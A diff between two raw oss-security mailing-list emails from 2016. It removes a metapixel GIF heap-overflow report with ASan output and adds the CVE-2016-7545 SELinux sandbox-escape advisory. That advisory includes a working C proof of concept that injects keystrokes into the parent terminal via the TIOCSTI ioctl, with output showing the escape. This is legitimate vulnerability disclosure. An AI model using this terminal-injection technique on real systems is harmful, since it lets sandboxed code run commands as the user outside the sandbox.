@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3945" "Tuesday" "22" "November" "2016" "17:52:54" "+0100" "Agostino Sarubbo" "ago@gentoo.org" "<2093176.kk87qeuY9I@arcadia>" "110" "[oss-security] metapixel: heap-based buffer overflow in open_gif_file (rwgif.c)" nil nil nil "11" "2016112216:52:54" "[oss-security] metapixel: heap-based buffer overflow in open_gif_file (rwgif.c)" (number mark "U       ago@gentoo.o Nov 22  110/3945  " thread-indent "\"[oss-security] metapixel: heap-based buffer overflow in open_gif_file (rwgif.c)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1150" "Sunday" "25" "September" "2016" "13:49:11" "+0200" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20160925134911.18991732ntfvg5a8@webmail.alunos.dcc.fc.up.pt>" "42" "[oss-security] CVE-2016-7545 -- SELinux sandbox escape" nil nil nil "9" "2016092511:49:11" "[oss-security] CVE-2016-7545 -- SELinux sandbox escape" (number mark "U       up201407890@ Sep 25   42/1150  " thread-indent "\"[oss-security] CVE-2016-7545 -- SELinux sandbox escape\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 11357 invoked by uid 550); 22 Nov 2016 16:53:06 -0000
+Received: (qmail 27888 invoked by uid 550); 25 Sep 2016 11:57:26 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,124 +12,61 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 11329 invoked from network); 22 Nov 2016 16:53:05 -0000
-From: Agostino Sarubbo <ago@gentoo.org>
+Received: (qmail 24275 invoked from network); 25 Sep 2016 11:49:26 -0000
+Message-ID: <20160925134911.18991732ntfvg5a8@webmail.alunos.dcc.fc.up.pt>
+Date: Sun, 25 Sep 2016 13:49:11 +0200
+From: up201407890@alunos.dcc.fc.up.pt
 To: oss-security@lists.openwall.com
-Date: Tue, 22 Nov 2016 17:52:54 +0100
-Message-ID: <2093176.kk87qeuY9I@arcadia>
-User-Agent: KMail/4.14.10 (Linux/4.1.15-gentoo-r1; KDE/4.14.24; x86_64; ; )
 MIME-Version: 1.0
+Content-Type: text/plain;
+	charset=ISO-8859-1;
+	DelSp="Yes";
+	format="flowed"
+Content-Disposition: inline
 Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain; charset="utf-8"
-Subject: [oss-security] metapixel: heap-based buffer overflow in open_gif_file (rwgif.c)
+User-Agent: Internet Messaging Program (IMP) H3 (4.2)
+X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
+Subject: [oss-security] CVE-2016-7545 -- SELinux sandbox escape
 
-Description:
-metapixel is a program for generating photomosaics.
+Hi,
 
-A fuzzing on metapixel-imagesize revealed an overflow. The latest upstream=
-=20
-release was about ten years ago, so I didn=E2=80=99t made any report. The b=
-ug does not=20
-resides in any shared object which aren=E2=80=99t provided by the package. =
-If you have=20
-a web application which relies on the metapixel-imagesize binary, then you =
-are=20
-affected. Since the =E2=80=9CREAD of size 1=E2=80=9D it may don=E2=80=99t w=
-arrant a CVE at all, but=20
-some distros and packagers would have the bug fixed in their repository, so=
-=20
-I=E2=80=99m sharing it.
+When executing a program via the SELinux sandbox, the nonpriv session
+can escape to the parent session by using the TIOCSTI ioctl to push
+characters into the terminal's input buffer, allowing an attacker to
+escape the sandbox.
 
-The complete ASan output:
+$ cat test.c
+#include <unistd.h>
+#include <sys/ioctl.h>
 
-# metapixel-imagesize $FILE
-=3D=3D24883=3D=3DERROR: AddressSanitizer: heap-buffer-overflow on address=20
-0x60200000eff9 at pc 0x00000050edcf bp 0x7ffce3891f90 sp 0x7ffce3891f88
-READ of size 1 at 0x60200000eff9 thread T0
-    #0 0x50edce in open_gif_file /tmp/portage/media-gfx/metapixel-1.0.2-
-r1/work/metapixel-1.0.2/rwimg/rwgif.c:132:60
-    #1 0x50a4cd in open_image_reading /tmp/portage/media-gfx/metapixel-1.0.=
-2-
-r1/work/metapixel-1.0.2/rwimg/readimage.c:88:9
-    #2 0x50a18b in main /tmp/portage/media-gfx/metapixel-1.0.2-
-r1/work/metapixel-1.0.2/imagesize.c:37:14
-    #3 0x7fcc5c3a861f in __libc_start_main /var/tmp/portage/sys-
-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
-    #4 0x41a1d8 in _init (/usr/bin/metapixel-imagesize+0x41a1d8)
+int main()
+{
+     char *cmd =3D "id\n";
+     while(*cmd)
+      ioctl(0, TIOCSTI, cmd++);
+     execlp("/bin/id", "id", NULL);
+}
 
-0x60200000eff9 is located 3 bytes to the right of 6-byte region=20
-[0x60200000eff0,0x60200000eff6)
-allocated by thread T0 here:
-    #0 0x4d3195 in calloc /tmp/portage/sys-devel/llvm-3.9.0-
-r1/work/llvm-3.9.0.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:72
-    #1 0x7fcc5d267392 in GifMakeMapObject /tmp/portage/media-
-libs/giflib-5.1.4/work/giflib-5.1.4/lib/gifalloc.c:55
+$ gcc test.c -o test
+$ /bin/sandbox ./test
+id
+uid=3D1000 gid=3D1000 groups=3D1000
+context=3Dunconfined_u:unconfined_r:sandbox_t:s0:c47,c176
+$ id    <------ did not type this
+uid=3D1000(saken) gid=3D1000(saken) groups=3D1000(saken)
+context=3Dunconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
-SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/media-
-gfx/metapixel-1.0.2-r1/work/metapixel-1.0.2/rwimg/rwgif.c:132:60 in=20
-open_gif_file
-Shadow bytes around the buggy address:
-  0x0c047fff9da0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff9db0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff9dc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff9dd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff9de0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-=3D>0x0c047fff9df0: fa fa fa fa fa fa fa fa fa fa 00 fa fa fa 06[fa]
-  0x0c047fff9e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff9e10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff9e20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff9e30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-  0x0c047fff9e40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
-Shadow byte legend (one shadow byte represents 8 application bytes):
-  Addressable:           00
-  Partially addressable: 01 02 03 04 05 06 07=20
-  Heap left redzone:       fa
-  Heap right redzone:      fb
-  Freed heap region:       fd
-  Stack left redzone:      f1
-  Stack mid redzone:       f2
-  Stack right redzone:     f3
-  Stack partial redzone:   f4
-  Stack after return:      f5
-  Stack use after scope:   f8
-  Global redzone:          f9
-  Global init order:       f6
-  Poisoned by user:        f7
-  Container overflow:      fc
-  Array cookie:            ac
-  Intra object redzone:    bb
-  ASan internal:           fe
-  Left alloca redzone:     ca
-  Right alloca redzone:    cb
-=3D=3D24883=3D=3DABORTING
+Bug report:
+https://bugzilla.redhat.com/show_bug.cgi?id=3D1378577
 
-Affected version:
-1.0.2
+Upstream fix:
+https://marc.info/?l=3Dselinux&m=3D147465160112766&w=3D2
+https://marc.info/?l=3Dselinux&m=3D147466045909969&w=3D2
+https://github.com/SELinuxProject/selinux/commit/acca96a135a4d2a028ba9b6368=
+86af99c0915379
 
-Fixed version:
-N/A
+Federico Bento.
 
-Commit fix:
-N/A
+----------------------------------------------------------------
+This message was sent using IMP, the Internet Messaging Program.
 
-Credit:
-This bug was discovered by Agostino Sarubbo of Gentoo.
-
-Reproducer:
-https://github.com/asarubbo/poc/blob/master/00058-metapipxel-heapoverflow-o=
-pen_gif_file
-
-Timeline:
-2016-11-22: bug discovered
-2016-11-22: blog post about the issue
-
-Note:
-This bug was found with American Fuzzy Lop.
-
-Permalink:
-https://blogs.gentoo.org/ago/2016/11/22/metapixel-heap-based-buffer-overflo=
-w-in-open_gif_file-rwgif-c
-
---=20
-Agostino Sarubbo
-Gentoo Linux Developer
